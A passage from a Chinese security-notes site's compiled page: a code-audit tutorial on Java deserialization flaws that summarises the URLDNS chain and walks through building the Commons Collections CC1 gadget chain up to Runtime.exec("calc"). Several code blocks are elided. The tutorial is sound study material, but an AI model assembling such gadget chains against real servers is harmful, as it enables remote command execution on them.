</code></pre><p>如果不调用此方法，对象的属性将无法被正确还原</p></li><li><p><strong>反序列化自动触发</strong> - 当服务端调用<code>readObject()</code>反序列化数据时，会自动执行重写的<code>readObject()</code>方法中的恶意代码</p></li></ol><p><strong>这就是反序列化漏洞的核心原理：</strong></p><ul><li>攻击者构造包含恶意<code>readObject()</code>方法的序列化对象</li><li>服务端反序列化时自动执行<code>readObject()</code>中的代码</li><li>从而实现远程命令执行(RCE)</li></ul><p><strong>为什么这样危险？</strong></p><ul><li>服务端无法控制<code>readObject()</code>中执行的代码</li><li>只要反序列化数据，就会自动执行恶意代码</li><li>攻击者可以执行任意系统命令，完全控制服务器</li></ul><h3 id="java-反序列化漏洞利用链条分析" tabindex="-1"><a class="header-anchor" href="#java-反序列化漏洞利用链条分析"><span>Java 反序列化漏洞利用链条分析</span></a></h3><h4 id="urldns-链" tabindex="-1"><a class="header-anchor" href="#urldns-链"><span>URLDNS 链</span></a></h4><pre><code class="language-java">
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
...
<span class="token punctuation">}</span>
</code></pre><p>也可以查看下序列化后的 1.txt</p><pre><code>STREAM_MAGIC - 0xac ed
              ...
              java.lang.Integer
                values
                  value
                    (int)1 - 0x00 00 00 01
          TC_ENDBLOCKDATA - 0x78
</code></pre><p><strong>总结 URLDNS 链：</strong></p><pre><code>HashMap.readObject()-&gt; HashMap.putVul-&gt;HashMap.hash()-&gt;URLStreamHandler.hashcode().getHostAddress-&gt;URLStreamHandler().hashCode().getAddressHost-&gt;getByName()
</code></pre><h4 id="cci-链" tabindex="-1"><a class="header-anchor" href="#cci-链"><span>CCI 链</span></a></h4><p>Apache Commons Collections 是一个扩展了 Java 标准库里的 Collection 结构的第三方基础库，它提供了很多强大的数据结构类型和实现了各种集合工具类。作为 Apache 开放项目的重要组件，Commons Collections 被广泛的各种 Java 应用的开发。commons-collections 组件反序列化漏洞的反射链也称为 CC 链，自从 apache commons-collections 组件爆出第一个 Java 反序列化漏洞后，就像打开了 Java 安全的新世界大门一样，之后很多 Java 中间件相继都爆出反序列化漏洞。</p><p>CC1 链有两条一条是<code>Transform</code>链另一条是<code>LazyMap</code>链。</p><p>首先明确要实现的目标是：</p><pre><code class="language-java"><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">&quot;calc&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><p>因此首先要获得 Runtime</p><pre><code class="language-java"><span class="token class-name">Class</span> c <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>
</code></pre><p>为什么不用 Runtime.getRuntime() 换成了 Runtime.class ？</p><p>前者是一个 java.lang.Runtime 对象，后者是一个 java.lang.Class 对象。Class 类有实现 Serializable 接口，所以可以被序列化。</p><p>ConstantTransformer 可以传一个 Runtime 类进去，当被遍历时调用 transform 方法可以返回一个 Runtime 类，正好作为下一个 Transformer 的 transform 方法中的参数。因此 Transformer 数组第一个 Transformer 如下：</p><pre><code class="language-java"><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
...
</code></pre><p>现在已经有了 Runtime 类，那么考虑传一个 getMethod 进去，然后通过反射让 Runtime 类调用 getMethod 方法，参数即为 getRuntime，因此第二个 Transformer 如下：</p><pre><code class="language-java"><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
...
<span class="token punctuation">}</span>
</code></pre><p>然后需要调用 invoke 方法，因此传 invoke 进去，第三个 Transformer 如下：</p><pre><code class="language-java"><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
...
<span class="token punctuation">}</span>
</code></pre><p>最后调用 exec 方法，因此传 exec 进去，参数是命令，第四个 Transformer 如下：</p><pre><code class="language-java"><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
  <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
...
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre><p>把 Transformer[]传给 ChainedTransformer</p><pre><code class="language-java"><span class="token class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><p>TransformedMap 是实现了 Serializable 的类，构造函数接收 map，key，value。key，value 都是 Transformer。</p><p>把 transformerChain 传给 TransformedMap.decorate，造出一个 TransformedMap 对象存在 tmap 中</p><pre><code class="language-java"><span class="token class-name">Map</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
...
<span class="token class-name">Object</span> o <span class="token operator">=</span> declaredConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Retention</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> tmap<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><p>我们查看它的<code>readObject</code>方法（8u71 以后做了一些修改）</p><pre><code class="language-java">    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span> var1<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>
    ...
    <span class="token punctuation">}</span>
</code></pre><p>核心逻辑就是 <code>Iterator var4 = this.memberValues.entrySet().iterator();</code> 和<code>var5.setValue(...)</code></p><p>memberValues 就是反序列化后得到的 Map，也是经过了 TransformedMap 修饰的对象，这里遍历了它的所有元素，并依次设置值。在调用 setValue 设置值的时候就会触发 TransformedMap 里注册的 Transform，进而执行我们为其精心设计的任意代码。</p><p>所以，我们构造 POC 的时候，就需要创建一个<code>AnnotationInvocationHandler</code>对象，并将前面构造的<code>HashMap</code>设置进来</p><pre><code class="language-java"><span class="token class-name">Class</span> cls <span class="token operator">=</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
...
</code></pre><p>这里因为<code>sun.reflect.annotation.AnnotationInvocationHandler</code>是在 JDK 内部的类，不能直接使用 new 来实例化。可以使用反射获取它的构造方法，并将其设置成外部可见的，再调用就可以实例化了。<code>AnnotationInvocationHandler</code>类的构造函数有两个参数，第一个参数是一个<code>Annotation</code>类；第二个是参数就是前面构造的<code>Map</code></p><p>在 <code>AnnotationInvocationHandler#readObject</code> 的逻辑中，有一个 if 语句对 var7 进行判断，只有在其不是<code>null</code>的时候才会进入里面执行<code>setValue</code>，否则不会进入也就不会触发漏洞。</p><p>那么如何让这个 var7 不为 null 呢？两个条件</p><ol><li><code>sun.reflect.annotation.AnnotationInvocationHandler</code>构造函数的第一个参数必须是 <code>Annotation</code>的子类，且其中必须含有至少一个方法，假设方法名是 X</li><li>被<code>TransformedMap.decorate</code>修饰的 Map 中必须有一个键名为<code>X</code>的元素</li></ol><p>所以，这也就是前面用到<code>Retention.class</code>的原因，因为 Retention 有一个方法，名为<code>value</code>；所以，为了再满足第二个条件，需要给 Map 中放入一个 Key 是<code>value</code>的元素：</p><pre><code class="language-java"><span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">&quot;value&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;xxxx&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><p>若不设置为 value</p><figure><img src="`+i+`" alt="img6" tabindex="0" loading="lazy"><figcaption>img6</figcaption></figure><pre><code>寻找链的思路：
...
</code></pre>`,176)])])}const f=s(r,[["render",d]]),y=JSON.parse('{"path":"/CodeAudittutorial/3-JavaVul/deserialize.html","title":"反序列化漏洞详解","lang":"zh-CN","frontmatter":{"category":"代码审计","tags":["Java"],"star":"1","sticky":"1","description":"反序列化漏洞详解 这里记录反序列化漏洞原理(Java 为主)，分析了 DNSURL 链。 反序列化漏洞简介 许多编程语言都提供对序列化的内在支持 PHP 将对象序列化为字符串格式 img8img8 Java 将对象序列化为二进制格式 Java 中的 API 实现： 位置：java.objectOuputStream java.io.ObjectInpu...","head":[["meta",{"property":"og:url","content":"https://echo0d.github.io/DailyNotes/CodeAudittutorial/3-JavaVul/deserialize.html"}],["meta",{"property":"og:site_name","content":"echo0d-notes"}],["meta",{"property":"og:title","content":"反序列化漏洞详解"}],["meta",{"property":"og:description","content":"反序列化漏洞详解 这里记录反序列化漏洞原理(Java 为主)，分析了 DNSURL 链。 反序列化漏洞简介 许多编程语言都提供对序列化的内在支持 PHP 将对象序列化为字符串格式 img8img8 Java 将对象序列化为二进制格式 Java 中的 API 实现： 位置：java.objectOuputStream java.io.ObjectInpu..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2026-01-06T08:34:13.000Z"}],["meta",{"property":"article:author","content":"echo0d"}],["meta",{"property":"article:tag","content":"Java"}],["meta",{"property":"article:modified_time","content":"2026-01-06T08:34:13.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"反序列化漏洞详解\\",\\"image\\":[\\"\\"],\\"dateModified\\":\\"2026-01-06T08:34:13.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"echo0d\\",\\"url\\":\\"\\"}]}"]]},"headers":[{"level":3,"title":"反序列化漏洞简介","slug":"反序列化漏洞简介","link":"#反序列化漏洞简介","children":[]},{"level":3,"title":"Java 反序列化原理","slug":"java-反序列化原理","link":"#java-反序列化原理","children":[]},{"level":3,"title":"为什么会产生安全问题？","slug":"为什么会产生安全问题","link":"#为什么会产生安全问题","children":[]},{"level":3,"title":"核心误解","slug":"核心误解","link":"#核心误解","children":[]},{"level":3,"title":"Java 反序列化执行系统命令","slug":"java-反序列化执行系统命令","link":"#java-反序列化执行系统命令","children":[]},{"level":3,"title":"Java 反序列化漏洞利用链条分析","slug":"java-反序列化漏洞利用链条分析","link":"#java-反序列化漏洞利用链条分析","children":[]}],"git":{"createdTime":1723730045000,"updatedTime":1767688453000,"contributors":[{"name":"echo0d","email":"echo0d@163.com","commits":7}]},"readingTime":{"minutes":18.94,"words":5683},"filePathRelative":"CodeAudittutorial/3-JavaVul/deserialize.md","localizedDate":"2024年8月15日","excerpt":"\\n<p>这里记录反序列化漏洞原理(Java 为主)，分析了 DNSURL 链。</p>\\n","autoDesc":true}');export{f as comp,y as data};
